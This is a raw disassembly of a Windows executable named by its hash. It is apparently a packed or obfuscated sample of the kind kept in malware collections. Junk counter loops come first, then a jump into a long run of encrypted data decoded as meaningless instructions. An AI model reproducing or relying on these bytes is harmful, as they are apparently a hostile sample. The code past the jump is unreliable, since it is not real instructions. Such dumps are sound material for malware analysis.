
782d57cb7688aca910e50a143007892bbb2c9e5062979b0a28bcb58102fb1671.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a292,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a266,0x13
  401024:	cmp    DWORD PTR ds:0x42a266,0x0
  40102b:	je     0x401065
  401031:	cmp    DWORD PTR ds:0x42a266,0x23
  401038:	ja     0x401065
  40103e:	jmp    0x401053
  401043:	push   0x42a28a
  401048:	push   0x4291e3
  40104d:	call   DWORD PTR ds:0x42a3f2
  401053:	mov    ecx,DWORD PTR ds:0x42a266
  401059:	dec    ecx
  40105a:	mov    DWORD PTR ds:0x42a266,ecx
  401060:	jmp    0x401024
  401065:	push   edi
  401066:	and    DWORD PTR ds:0x42a2b6,0x0
  401070:	mov    esi,DWORD PTR ds:0x42a2b6
  401076:	inc    esi
  401077:	mov    DWORD PTR ds:0x42a2b6,esi
  40107d:	cmp    DWORD PTR ds:0x42a2b6,0x4
  401084:	jg     0x4010ce
  40108a:	jmp    0x4010a5
  40108f:	push   0x5221
  401094:	push   0x42a2ce
  401099:	push   DWORD PTR [ebp-0x10]
  40109c:	push   DWORD PTR [ebp-0x14]
  40109f:	call   DWORD PTR ds:0x42a3f6
  4010a5:	cmp    DWORD PTR ds:0x42a2b6,0x3
  4010ac:	jne    0x4010c1
  4010b2:	xor    esi,esi
  4010b4:	or     esi,DWORD PTR ds:0x42a2b6
  4010ba:	inc    esi
  4010bb:	mov    DWORD PTR ds:0x42a2b6,esi
  4010c1:	cmp    DWORD PTR ds:0x42a2b6,0x15
  4010c8:	jb     0x401070
  4010ce:	mov    esi,0x75108aa
  4010d3:	mov    ecx,DWORD PTR ds:0x42a376
  4010d9:	mov    ecx,DWORD PTR [ecx]
  4010db:	add    DWORD PTR ds:0x42a256,ecx
  4010e1:	xor    eax,esi
  4010e3:	and    DWORD PTR ds:0x42a286,0x0
  4010ed:	mov    ecx,DWORD PTR ds:0x42a286
  4010f3:	inc    ecx
  4010f4:	mov    DWORD PTR ds:0x42a286,ecx
  4010fa:	cmp    DWORD PTR ds:0x42a286,0x1f
  401101:	jge    0x40112c
  401107:	jmp    0x40111f
  40110c:	push   DWORD PTR [ebp-0xc]
  40110f:	push   0x429231
  401114:	push   0x42916d
  401119:	call   DWORD PTR ds:0x42a3b6
  40111f:	cmp    DWORD PTR ds:0x42a286,0x1e
  401126:	jb     0x4010ed
  40112c:	mov    edi,0x3272f1
  401131:	add    eax,edi
  401133:	and    DWORD PTR ds:0x42a292,0x0
  40113d:	jmp    0x401151
  401142:	xor    ecx,ecx
  401144:	xor    ecx,DWORD PTR ds:0x42a292
  40114a:	inc    ecx
  40114b:	mov    DWORD PTR ds:0x42a292,ecx
  401151:	cmp    DWORD PTR ds:0x42a292,0x1e
  401158:	jae    0x40119f
  40115e:	cmp    DWORD PTR ds:0x42a292,0xe
  401165:	ja     0x40119f
  40116b:	jmp    0x40117e
  401170:	push   0x42916d
  401175:	push   DWORD PTR [ebp-0x18]
  401178:	call   DWORD PTR ds:0x42a3ba
  40117e:	cmp    DWORD PTR ds:0x42a292,0xd
  401185:	jne    0x40119a
  40118b:	xor    ecx,ecx
  40118d:	or     ecx,DWORD PTR ds:0x42a292
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a292,ecx
  40119a:	jmp    0x401142
  40119f:	mov    DWORD PTR [ebp-0x40],eax
  4011a2:	mov    eax,ds:0x42a2ca
  4011a7:	sbb    DWORD PTR ds:0x42a25a,eax
  4011ad:	mov    eax,ds:0x42929e
  4011b2:	sub    DWORD PTR ds:0x42a2fa,ecx
  4011b8:	mov    eax,DWORD PTR [eax]
  4011ba:	mov    DWORD PTR [ebp-0x3c],eax
  4011bd:	inc    eax
  4011be:	mov    eax,ds:0x4294ae
  4011c3:	and    DWORD PTR ds:0x42a26a,0x0
  4011cd:	jmp    0x4011df
  4011d2:	mov    ecx,DWORD PTR ds:0x42a26a
  4011d8:	inc    ecx
  4011d9:	mov    DWORD PTR ds:0x42a26a,ecx
  4011df:	cmp    DWORD PTR ds:0x42a26a,0x1f
  4011e6:	jae    0x401233
  4011ec:	cmp    DWORD PTR ds:0x42a26a,0x4
  4011f3:	jge    0x401233
  4011f9:	jmp    0x401214
  4011fe:	push   0x586f
  401203:	push   DWORD PTR [ebp-0x18]
  401206:	push   DWORD PTR [ebp-0x14]
  401209:	push   0x8d08
  40120e:	call   DWORD PTR ds:0x42a3be
  401214:	cmp    DWORD PTR ds:0x42a26a,0x3
  40121b:	jne    0x40122e
  401221:	mov    ecx,DWORD PTR ds:0x42a26a
  401227:	inc    ecx
  401228:	mov    DWORD PTR ds:0x42a26a,ecx
  40122e:	jmp    0x4011d2
  401233:	mov    eax,DWORD PTR [eax]
  401235:	add    ecx,0x507d
  40123b:	mov    DWORD PTR [ebp-0x1c],eax
  40123e:	xor    ecx,0x7815
  401244:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  40124b:	or     DWORD PTR ds:0x42a2da,0x4fa4
  401255:	mov    eax,DWORD PTR [ebp-0x34]
  401258:	xor    eax,esi
  40125a:	sub    ecx,DWORD PTR ds:0x42a2ce
  401260:	add    eax,edi
  401262:	and    DWORD PTR ds:0x42a266,edi
  401268:	mov    DWORD PTR [ebp-0x40],eax
  40126b:	mov    eax,ds:0x42941e
  401270:	jmp    0x403621
  401275:	retf   
  401276:	sbb    al,0x56
  401278:	or     eax,DWORD PTR [esi+0x409c8605]
  40127e:	sub    eax,0xb7fe0c0c
  401283:	inc    edx
  401284:	test   BYTE PTR [ebx-0x107c7c7d],0x5e
  40128b:	add    DWORD PTR [ebx+0x38262d24],0x20
  401292:	xor    al,0x22
  401294:	cs je  0x4012d4
  401297:	jo     0x401310
  401299:	dec    esi
  40129a:	jo     0x40130f
  40129c:	jae    0x40130a
  40129e:	dec    ebx
  40129f:	aam    0xdd
  4012a1:	clc    
  4012a2:	imul   edx,DWORD PTR [ecx+0x72],0x79a96278
  4012a9:	ins    BYTE PTR es:[edi],dx
  4012aa:	pusha  
  4012ab:	into   
  4012ac:	pop    esp
  4012ad:	push   ebx
  4012ae:	cmp    DWORD PTR [ebp+0x66879603],ecx
  4012b4:	dec    esp
  4012b5:	jle    0x4012fd
  4012b7:	mov    DWORD PTR [edi+0x42bbb97e],esi
  4012bd:	sub    eax,0x3dd77fe
  4012c2:	push   0x7e
  4012c4:	pop    ds
  4012c5:	in     al,dx
  4012c6:	inc    eax
  4012c7:	int3   
  4012c8:	ret    
  4012c9:	in     al,dx
  4012ca:	xchg   esi,eax
  4012cb:	sub    bl,bh
  4012cd:	xchg   edx,eax
  4012ce:	xor    BYTE PTR [esi],cl
  4012d0:	pusha  
  4012d1:	mov    dl,0x93
  4012d3:	aad    0x6
  4012d5:	ins    BYTE PTR es:[edi],dx
  4012d6:	fcom   QWORD PTR ds:0x37030fe5
  4012dc:	and    DWORD PTR [ecx+0xd],edx
  4012df:	aaa    
  4012e0:	jb     0x401353
  4012e2:	shr    BYTE PTR [esi-0x48eba7d6],0xfe
  4012e9:	lock push eax
  4012eb:	xor    al,BYTE PTR [ebp+0x62d14b]
  4012f1:	and    eax,DWORD PTR [ebx]
  4012f3:	cmp    DWORD PTR [eax+0x5ea1dc7a],0x2516b892
  4012fd:	fwait
  4012fe:	dec    eax
  4012ff:	or     bl,BYTE PTR [edi+0x128a8b3d]
  401305:	jecxz  0x401333
  401307:	imul   ecx,DWORD PTR [ebp+eax*2-0x31059ab6],0xffffff93
  40130f:	xor    BYTE PTR [eax-0x6e323937],dl
  401315:	push   0x4d6b54f5
  40131a:	or     eax,0x1a470a3f
  40131f:	lods   al,BYTE PTR ds:[esi]
  401320:	push   edx
  401321:	shl    DWORD PTR [esi+0x6715d949],cl
  401327:	cld    
  401328:	imul   esp,DWORD PTR [edi-0x4c],0x0
  40132c:	jno    0x4012ec
  40132e:	add    DWORD PTR [ebx+0x1d],ebx
  401331:	and    al,0x6
  401333:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401334:	jb     0x40134e
  401336:	repnz and bl,bl
  401339:	loop   0x401342
  40133b:	inc    eax
  40133c:	retf   0xe7c5
  40133f:	pusha  
  401340:	add    eax,0x1a1c2cab
  401345:	jecxz  0x401336
  401347:	std    
  401348:	clc    
  401349:	popf   
  40134a:	dec    edi
  40134b:	or     eax,0x6658b55f
  401350:	ds in  eax,dx
  401352:	inc    ebx
  401353:	test   eax,0x1073e386
  401358:	dec    esp
  401359:	lods   eax,DWORD PTR ds:[esi]
  40135a:	pusha  
  40135b:	inc    esp
  40135c:	add    al,0x44
  40135e:	or     eax,0xeff4baa5
  401363:	jmp    0x401304
  401365:	mov    bl,0xeb
  401367:	mov    DWORD PTR [ebx],esp
  401369:	xor    ecx,edi
  40136b:	call   0xc7edb928
  401370:	pop    es
  401371:	std    
  401372:	in     al,0xb
  401374:	test   DWORD PTR [ecx],esi
  401376:	lods   al,BYTE PTR ds:[esi]
  401377:	push   esp
  401378:	push   edi
  401379:	pop    edi
  40137a:	imul   ebp,DWORD PTR [esi+0x46],0x917c6c3d
  401381:	mov    esp,ebx
  401383:	call   0xfe68:0x83d7540
  40138a:	das    
  40138b:	jg     0x40132e
  40138d:	data16 jno 0x4013e6
  401390:	loop   0x401386
  401392:	and    BYTE PTR [eax+0x3e],ah
  401395:	sar    BYTE PTR [ebx-0x19],cl
  401398:	std    
  401399:	cld    
  40139a:	push   esp
  40139b:	mov    eax,0x5e2936a2
  4013a0:	push   0xffffffcd
  4013a2:	fsubr  QWORD PTR [ebx+0x3a]
  4013a5:	add    al,0x38
  4013a7:	(bad)  
  4013a8:	aaa    
  4013a9:	xor    edx,DWORD PTR [eax+0x7a]
  4013ac:	xchg   ecx,eax
  4013ad:	inc    esp
  4013ae:	jo     0x40141b
  4013b0:	imul   esi,DWORD PTR [ecx+edi*2],0xce3be6a9
  4013b7:	js     0x4013d8
  4013b9:	mov    ebp,edi
  4013bb:	push   edi
  4013bc:	lea    ebp,[esi-0x166c909f]
  4013c2:	pop    edx
  4013c3:	popa   
  4013c4:	dec    esp
  4013c5:	mov    edi,0x3cfc35be
  4013ca:	and    al,0xb7
  4013cc:	das    
  4013cd:	retf   
  4013ce:	sbb    edi,DWORD PTR ss:[edx+0x5c]
  4013d2:	(bad)  
  4013d3:	jmp    0x401367
  4013d5:	xchg   edi,eax
  4013d6:	cmp    edx,DWORD PTR [ebx+0x2e546e44]
  4013dc:	and    BYTE PTR [esi+edi*2+0x3c],0x3d
  4013e1:	xchg   esi,eax
  4013e2:	outs   dx,BYTE PTR ds:[esi]
  4013e3:	lds    ecx,FWORD PTR [ebp+0x5f]
  4013e6:	cli    
  4013e7:	jl     0x4013e0
  4013e9:	ja     0x401381
  4013eb:	pusha  
  4013ec:	retf   
  4013ed:	fmul   st,st(3)
  4013ef:	outs   dx,DWORD PTR ds:[esi]
  4013f0:	xchg   ebp,eax
  4013f1:	dec    eax
  4013f2:	jge    0x40141a
  4013f4:	adc    BYTE PTR [ecx+0x2e],dh
  4013f7:	fwait
  4013f8:	and    bl,ch
  4013fa:	in     eax,dx
  4013fb:	lahf   
  4013fc:	cmp    eax,0xfc555f1a
  401401:	mov    ch,0x6c
  401403:	add    esi,DWORD PTR [ebp-0x1e5951e8]
  401409:	call   0xd0fd4335
  40140e:	hlt    
  40140f:	jnp    0x40140f
  401411:	in     eax,0xd7
  401413:	js     0x40144e
  401415:	fld    QWORD PTR [edx-0x770c207b]
  40141b:	fcom   QWORD PTR [ebx]
  40141d:	or     dh,BYTE PTR [ebx+0x7a3f0c7c]
  401423:	loopne 0x4013f1
  401425:	add    BYTE PTR [eax+eax*4+0x8],0xc9
  40142a:	dec    edx
  40142b:	imul   ebp,DWORD PTR [edx-0x12],0x68bf75a5
  401432:	icebp  
  401433:	mov    al,0x55
  401435:	inc    edx
  401436:	ins    BYTE PTR es:[edi],dx
  401437:	add    DWORD PTR [edi-0x29],edx
  40143a:	pop    eax
  40143b:	jnp    0x401403
  40143d:	add    BYTE PTR [edx+0x159d9a1b],ah
  401443:	shl    ch,0x4e
  401446:	call   0x94f7:0xd30a8dbc
  40144d:	mov    bh,0xe5
  40144f:	mov    dh,0xf7
  401451:	sub    edx,edx
  401453:	adc    edi,ebx
  401455:	inc    ebp
  401456:	hlt    
  401457:	mov    DWORD PTR [ecx],edi
  401459:	xchg   ecx,eax
  40145a:	ja     0x4014d4
  40145c:	in     al,dx
  40145d:	mov    DWORD PTR [esi-0x3f],esp
  401460:	lahf   
  401461:	pop    ebx
  401462:	and    BYTE PTR [esi],dl
  401464:	or     eax,DWORD PTR [eax]
  401466:	sti    
  401467:	pop    es
  401468:	cmc    
  401469:	cmp    ah,BYTE PTR [ecx-0xde22b65]
  40146f:	addr16 icebp 
  401471:	fisttp QWORD PTR [eax+0x21726296]
  401477:	pop    eax
  401478:	lock mov es,WORD PTR [eax]
  40147b:	fld    QWORD PTR [eax+ecx*8-0x6d0689b6]
  401482:	rcl    BYTE PTR [esi],0x94
  401485:	cdq    
  401486:	aam    0xd
  401488:	test   BYTE PTR [eax+0x4a],0x97
  40148c:	icebp  
  40148d:	xchg   esp,eax
  40148e:	lods   al,BYTE PTR ds:[esi]
  40148f:	mov    bh,0x5d
  401491:	pop    edx
  401492:	cmp    BYTE PTR [edi],ah
  401494:	fcmovbe st,st(2)
  401496:	jg     0x4014bc
  401498:	fist   WORD PTR ds:[eax]
  40149b:	test   ecx,eax
  40149d:	adc    ebp,DWORD PTR [edx+0x400ecb19]
  4014a3:	push   DWORD PTR [ebx]
  4014a5:	test   bh,bl
  4014a7:	cli    
  4014a8:	mov    WORD PTR [edx+edi*2-0x13a62654],gs
  4014af:	cld    
  4014b0:	sub    esp,edi
  4014b2:	mov    dl,0x22
  4014b4:	cli    
  4014b5:	lahf   
  4014b6:	ror    bh,cl
  4014b8:	jns    0x4014cf
  4014ba:	inc    edx
  4014bb:	and    al,0x48
  4014bd:	or     al,0x67
  4014bf:	cmp    DWORD PTR [edx-0x2],eax
  4014c2:	jns    0x401463
  4014c4:	pusha  
  4014c5:	mov    eax,ds:0x3f858189
  4014ca:	jae    0x4014e0
  4014cc:	bound  esp,QWORD PTR [ebp+0x79]
  4014cf:	fdivr  DWORD PTR [edx+0x5978612a]
  4014d5:	push   cs
  4014d6:	mov    al,ds:0x65755747
  4014db:	push   edx
  4014dc:	dec    esi
  4014dd:	sbb    BYTE PTR [ecx-0x52],al
  4014e0:	push   ebp
  4014e1:	jmp    0xb629:0x26b91f45
  4014e8:	xchg   esi,eax
  4014e9:	(bad)  
  4014ea:	xchg   esi,eax
  4014eb:	daa    
  4014ec:	mov    esp,0x999d6dbe
  4014f1:	lahf   
  4014f2:	push   edi
  4014f3:	leave  
  4014f4:	dec    edi
  4014f5:	fsub   QWORD PTR ds:0xb967daaa
  4014fb:	lds    ecx,FWORD PTR [edx+0x1ebab1c5]
  401501:	hlt    
  401502:	addr16 popf 
  401504:	adc    al,0x8c
  401506:	(bad)  
  401507:	and    al,0xa4
  401509:	popf   
  40150a:	in     al,dx
  40150b:	jmp    0x401521
  40150d:	ret    
  40150e:	push   edi
  40150f:	or     BYTE PTR [edi+eiz*4],bl
  401512:	movntpd XMMWORD PTR [ebp+0x47],xmm4
  401517:	xchg   edi,eax
  401518:	mov    al,ds:0x119555db
  40151d:	cld    
  40151e:	mov    dh,0xa0
  401520:	pop    DWORD PTR [ebx]
  401522:	jbe    0x401532
  401524:	inc    ebp
  401525:	xor    bh,BYTE PTR [edi+0x5]
  401528:	ins    BYTE PTR es:[edi],dx
  401529:	dec    ebx
  40152a:	aad    0xa9
  40152c:	fnsave [ebx+0x30]
  40152f:	push   0x2c
  401531:	gs pop esi
  401533:	mov    ah,0xb1
  401535:	adc    ch,dh
  401537:	call   0x9686:0xb7679915
  40153e:	div    DWORD PTR [eax]
  401540:	xchg   esp,eax
  401541:	stc    
  401542:	cwde   
  401543:	fsub   DWORD PTR [ecx-0x1d338d9]
  401549:	(bad)  
  40154a:	shl    BYTE PTR [ebx+ecx*8],cl
  40154d:	mov    BYTE PTR [ecx],ch
  40154f:	iret   
  401550:	pushf  
  401551:	pop    ds
  401552:	rcr    DWORD PTR [eax],1
  401554:	xor    DWORD PTR cs:[ebp+esi*4+0x7f97cab7],esi
  40155c:	push   esi
  40155d:	pop    ecx
  40155e:	scas   al,BYTE PTR es:[edi]
  40155f:	aaa    
  401560:	dec    esi
  401561:	or     al,0x2
  401563:	xlat   BYTE PTR ds:[ebx]
  401564:	int3   
  401565:	sub    eax,0xea035ef8
  40156a:	lock xchg ecx,eax
  40156c:	xchg   ecx,eax
  40156d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40156e:	ins    DWORD PTR es:[edi],dx
  40156f:	push   cs
  401570:	inc    eax
  401571:	inc    edx
  401572:	xor    eax,0x631d339c
  401577:	in     al,0x93
  401579:	push   0xfffffff8
  40157b:	loop   0x40151e
  40157d:	and    esp,DWORD PTR [ecx]
  40157f:	push   ebp
  401580:	shl    DWORD PTR [ebp-0x74],0x52
  401584:	lods   eax,DWORD PTR ds:[esi]
  401585:	push   ecx
  401586:	push   esp
  401587:	mov    eax,0xffd68f27
  40158c:	pushf  
  40158d:	pop    ecx
  40158e:	lea    ebx,[edi+ebx*8-0x736f90a0]
  401595:	les    ecx,FWORD PTR [ebp*2-0x5d34b06e]
  40159c:	aam    0xa2
  40159e:	mov    WORD PTR [esi+0x4f152a83],ds
  4015a4:	clc    
  4015a5:	aam    0xb9
  4015a7:	or     edx,DWORD PTR [eax-0x2c]
  4015aa:	je     0x40160d
  4015ac:	pop    es
  4015ad:	sbb    BYTE PTR [eax],cl
  4015af:	mov    al,es:0x4c711cb7
  4015b5:	mov    bh,BYTE PTR [eax+0x75d66e50]
  4015bb:	mov    ebx,0x5f0865cd
  4015c0:	popf   
  4015c1:	dec    esi
  4015c2:	sbb    al,0x31
  4015c4:	pusha  
  4015c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015c6:	mov    ch,0x5d
  4015c8:	xlat   BYTE PTR ds:[bx]
  4015ca:	xchg   edi,eax
  4015cb:	xor    DWORD PTR [ebx],ecx
  4015cd:	lea    ebp,[edx+0x6acad0c2]
  4015d3:	in     al,dx
  4015d4:	inc    edi
  4015d5:	xchg   edx,eax
  4015d6:	and    al,0xf6
  4015d8:	push   eax
  4015d9:	pop    ss
  4015da:	xchg   esi,eax
  4015db:	jle    0x40160d
  4015dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015de:	jae    0x401626
  4015e0:	mov    esi,0x19e755a8
  4015e5:	call   0x5f76124b
  4015ea:	pop    ecx
  4015eb:	and    esp,DWORD PTR cs:[ecx-0x51]
  4015ef:	and    eax,DWORD PTR [edi]
  4015f1:	inc    edi
  4015f2:	adc    BYTE PTR [ecx+0x502cb1d5],ch
  4015f8:	dec    DWORD PTR [edi]
  4015fa:	mov    eax,ds:0x1fceb6a5
  4015ff:	sbb    esp,DWORD PTR [ecx]
  401601:	push   edx
  401602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401603:	popf   
  401604:	jecxz  0x4015eb
  401606:	mov    ah,0x55
  401608:	fidiv  DWORD PTR [ebx]
  40160a:	hlt    
  40160b:	sub    edi,DWORD PTR [ebx*8+0x25079dd]
  401612:	in     eax,0xf3
  401614:	jmp    0x84c1:0xff43757d
  40161b:	lahf   
  40161c:	push   0x2d69b98
  401621:	and    al,0x5e
  401623:	xor    ebp,DWORD PTR [esi+eax*1]
  401626:	fcomp  DWORD PTR [esi+ebx*2+0x5ecf4bcd]
  40162d:	loopne 0x4015e0
  40162f:	ffree  st(4)
  401631:	ror    edi,1
  401633:	inc    ecx
  401634:	adc    al,dl
  401636:	test   DWORD PTR [ebx-0x8e73964],eax
  40163c:	and    bh,BYTE PTR [ecx+0x33]
  40163f:	pop    ebx
  401640:	scas   al,BYTE PTR es:[edi]
  401641:	(bad)  
  401642:	xchg   edi,eax
  401643:	rcr    DWORD PTR [edx-0x34974545],1
  401649:	and    DWORD PTR [ecx+0x5],esi
  40164c:	call   0xcbfb:0xedb9f555
  401653:	stos   BYTE PTR es:[edi],al
  401654:	clc    
  401655:	mov    ah,0xf9
  401657:	xchg   bl,bl
  401659:	out    0x16,al
  40165b:	ret    
  40165c:	ror    DWORD PTR [ebx+0x7f],0x84
  401660:	mov    bl,0x34
  401662:	mov    ecx,0x336eedcc
  401667:	xor    al,0x54
  401669:	push   ecx
  40166a:	pop    ebx
  40166b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40166c:	push   edx
  40166d:	push   esp
  40166e:	mov    cl,0x1f
  401670:	test   BYTE PTR [esi-0x40],al
  401673:	mov    esp,0x52ae46e7
  401678:	jge    0x4016aa
  40167a:	sbb    DWORD PTR [ebx],esi
  40167c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40167d:	(bad)  
  40167e:	call   0x6ed3:0xa4d0be18
  401685:	outs   dx,DWORD PTR ds:[esi]
  401686:	nop
  401687:	sti    
  401688:	out    0x6c,al
  40168a:	cmp    ch,BYTE PTR [esi-0x80]
  40168d:	cdq    
  40168e:	jns    0x40170d
  401690:	ret    
  401691:	aad    0xb8
  401693:	rol    ah,cl
  401695:	xchg   ecx,eax
  401696:	and    BYTE PTR [eax-0x550777ab],ch
  40169c:	dec    ecx
  40169d:	add    eax,DWORD PTR [ecx+0x14eeea91]
  4016a3:	js     0x401697
  4016a5:	jns    0x40166e
  4016a7:	pop    ecx
  4016a8:	cmp    BYTE PTR [ecx-0x63],cl
  4016ab:	in     eax,dx
  4016ac:	ss popa 
  4016ae:	jae    0x401726
  4016b0:	cwde   
  4016b1:	xchg   esi,eax
  4016b2:	or     bh,bh
  4016b4:	lock ins BYTE PTR es:[edi],dx
  4016b6:	sub    BYTE PTR [esi+0x3a],ch
  4016b9:	inc    esi
  4016ba:	outs   dx,DWORD PTR ds:[esi]
  4016bb:	pop    es
  4016bc:	jg     0x401705
  4016be:	mov    al,0xc1
  4016c0:	xchg   esp,eax
  4016c1:	push   esp
  4016c2:	(bad)  [edi-0x50da580c]
  4016c8:	iret   
  4016c9:	addr16 imul ebp,eax,0xbe544630
  4016d0:	stos   DWORD PTR es:[edi],eax
  4016d1:	sbb    eax,edi
  4016d3:	jne    0x4016c7
  4016d5:	sub    edi,DWORD PTR ds:0xc8d2fd6c
  4016db:	gs or  al,0x7c
  4016de:	mov    ds:0x4cee4662,eax
  4016e3:	mov    ebp,DWORD PTR [ebx]
  4016e5:	and    al,cl
  4016e7:	shl    DWORD PTR [ebx+0x39785181],cl
  4016ed:	mov    ecx,0x344be32f
  4016f2:	adc    BYTE PTR [edi-0x11],0x70
  4016f6:	fild   QWORD PTR [esi+0x27]
  4016f9:	xchg   edx,eax
  4016fa:	xlat   BYTE PTR ds:[ebx]
  4016fb:	dec    esp
  4016fc:	loopne 0x401772
  4016fe:	out    dx,eax
  4016ff:	outs   dx,DWORD PTR ds:[esi]
  401700:	std    
  401701:	sbb    al,0x55
  401703:	pusha  
  401704:	dec    ebp
  401705:	dec    esi
  401706:	mov    edi,DWORD PTR [edi+0x68]
  401709:	mov    ebp,0x152730a
  40170e:	and    eax,0xa3bafee2
  401713:	mov    eax,0x39813dff
  401718:	popf   
  401719:	pop    esi
  40171a:	loop   0x401739
  40171c:	sub    al,BYTE PTR [ebx+eiz*4-0x5071eb71]
  401723:	call   0xed47:0xfea57d5b
  40172a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40172b:	xchg   ebp,eax
  40172c:	sbb    al,BYTE PTR [eax+0x57f9e4ea]
  401732:	outs   dx,BYTE PTR ds:[esi]
  401733:	js     0x4016ca
  401735:	mov    DWORD PTR [ebp+esi*2-0x16596345],ecx
  40173c:	jnp    0x4016c2
  40173e:	sub    eax,0x29b480ad
  401743:	fiadd  WORD PTR [ebp-0x59]
  401746:	pop    es
  401747:	cmp    DWORD PTR [eax],ebx
  401749:	cmc    
  40174a:	mov    BYTE PTR [edi],ah
  40174c:	inc    edx
  40174d:	daa    
  40174e:	aaa    
  40174f:	pop    ebx
  401750:	and    al,BYTE PTR [ebx+0xf]
  401753:	pop    esp
  401754:	cld    
  401755:	xor    al,0x4e
  401757:	add    eax,0xf530ba70
  40175c:	push   esi
  40175d:	mov    ds:0x513a60fd,eax
  401762:	popa   
  401763:	sub    eax,0x1694c296
  401768:	daa    
  401769:	or     bl,BYTE PTR [edi+0x6b]
  40176c:	out    dx,al
  40176d:	pop    edi
  40176e:	or     eax,0xa55263f5
  401773:	mov    eax,ds:0x81a916a3
  401778:	mov    cs,WORD PTR [edx]
  40177a:	inc    ebx
  40177b:	mov    WORD PTR [eax],ss
  40177d:	adc    al,0x95
  40177f:	xchg   esp,eax
  401780:	fcmovb st,st(5)
  401782:	aas    
  401783:	(bad)  
  401784:	mov    fs,WORD PTR [ebx-0x5faa2911]
  40178a:	push   ebp
  40178b:	retf   
  40178c:	sbb    ebx,0xffffffb4
  40178f:	mov    DWORD PTR [edi],eax
  401791:	or     al,0x71
  401793:	dec    ebx
  401794:	test   ch,al
  401796:	test   eax,0x7971c4ea
  40179b:	and    eax,0x2ba938fb
  4017a0:	in     eax,dx
  4017a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017a2:	scas   eax,DWORD PTR es:[edi]
  4017a3:	sbb    DWORD PTR [eax+esi*1-0x14],0xff9fbf49
  4017ab:	in     eax,dx
  4017ac:	fldenv [edx]
  4017ae:	adc    esp,DWORD PTR [edx-0x45f87922]
  4017b4:	mov    ch,bl
  4017b6:	pop    ds
  4017b7:	fstp   DWORD PTR [edx+0x3]
  4017ba:	fs push ecx
  4017bc:	mov    WORD PTR [ecx+eiz*2-0x3d6f2da7],ss
  4017c3:	dec    ecx
  4017c4:	sub    eax,0x4bfa51c1
  4017c9:	mov    dh,0x5c
  4017cb:	pop    esi
  4017cc:	call   0x27647007
  4017d1:	xchg   BYTE PTR [ecx-0x67],dh
  4017d4:	adc    DWORD PTR [edi],edx
  4017d6:	adc    al,0xcc
  4017d8:	pop    es
  4017d9:	dec    edx
  4017da:	fcom   DWORD PTR [ebx]
  4017dc:	sbb    al,0x89
  4017de:	ror    DWORD PTR [ecx+ecx*8],0x35
  4017e2:	dec    eax
  4017e3:	adc    eax,eax
  4017e5:	cmp    BYTE PTR [edi+esi*1],bh
  4017e8:	in     eax,dx
  4017e9:	xor    BYTE PTR [edi],0x3f
  4017ec:	scas   eax,DWORD PTR es:[edi]
  4017ed:	cld    
  4017ee:	xor    cl,BYTE PTR [eax+ebp*4]
  4017f1:	repnz inc ecx
  4017f3:	fmul   st,st(2)
  4017f5:	cmp    edx,DWORD PTR [ebx-0x1c]
  4017f8:	pop    es
  4017f9:	aaa    
  4017fa:	dec    esi
  4017fb:	inc    edx
  4017fc:	imul   DWORD PTR cs:[edx+0xd]
  401800:	cld    
  401801:	test   DWORD PTR ds:0x185ddc90,0x2ac41554
  40180b:	rcr    DWORD PTR [edx+eax*4+0x3122b8b9],0x0
  401813:	or     eax,0xba2c5dd0
  401818:	rol    esp,0x55
  40181b:	sub    ch,BYTE PTR [ecx-0x6fe039d0]
  401821:	dec    eax
  401822:	retf   
  401823:	mov    ch,0xbd
  401825:	mov    bl,0x3c
  401827:	pop    ecx
  401828:	xchg   BYTE PTR cs:[ebp+esi*1-0x7d6197c7],al
  401830:	xchg   edi,eax
  401831:	ja     0x4017e5
  401833:	xchg   ebx,ebx
  401835:	ds adc ecx,esi
  401838:	adc    eax,0x21c79725
  40183d:	dec    esi
  40183e:	retf   
  40183f:	pop    esp
  401840:	adc    ebx,ecx
  401842:	iret   
  401843:	inc    edx
  401844:	icebp  
  401845:	mov    BYTE PTR [eax+0x69c77e33],cl
  40184b:	mov    ah,0xd4
  40184d:	sti    
  40184e:	cmp    al,0xdc
  401850:	dec    edx
  401851:	mov    ebx,0x6b408eef
  401856:	test   DWORD PTR [edx],esi
  401858:	mov    edi,esi
  40185a:	call   FWORD PTR [edi+ecx*2-0x68]
  40185e:	xor    al,0xd6
  401860:	mov    al,BYTE PTR [eax+0x7d]
  401863:	jne    0x401881
  401865:	inc    esp
  401866:	clc    
  401867:	sbb    BYTE PTR [ebp-0x6a97b730],cl
  40186d:	jl     0x40184f
  40186f:	dec    edi
  401870:	hlt    
  401871:	hlt    
  401872:	inc    edi
  401873:	mov    eax,0xd0c5b577
  401878:	inc    esi
  401879:	dec    esi
  40187a:	arpl   WORD PTR [edx-0x41260e4b],cx
  401880:	outs   dx,BYTE PTR ds:[esi]
  401881:	adc    eax,0x3ad00326
  401886:	std    
  401887:	(bad)  
  401888:	sub    al,BYTE PTR [esp+eax*1-0x5f]
  40188c:	fidiv  WORD PTR [esi-0x21fad5d9]
  401892:	push   0xf65536aa
  401897:	cmp    DWORD PTR [edi+0x2c],edx
  40189a:	mov    esp,0xdb36055a
  40189f:	hlt    
  4018a0:	ret    0x6815
  4018a3:	or     DWORD PTR [edi],esi
  4018a5:	pmulhw mm0,QWORD PTR [eax]
  4018a8:	sbb    eax,0xd7994008
  4018ad:	mov    esi,0x40b034d4
  4018b2:	addr16 mov cl,0xa4
  4018b5:	fld    st(2)
  4018b7:	fwait
  4018b8:	xchg   esi,eax
  4018b9:	add    al,0x40
  4018bb:	in     eax,dx
  4018bc:	mov    dl,0xc4
  4018be:	mul    DWORD PTR [eax+0x59]
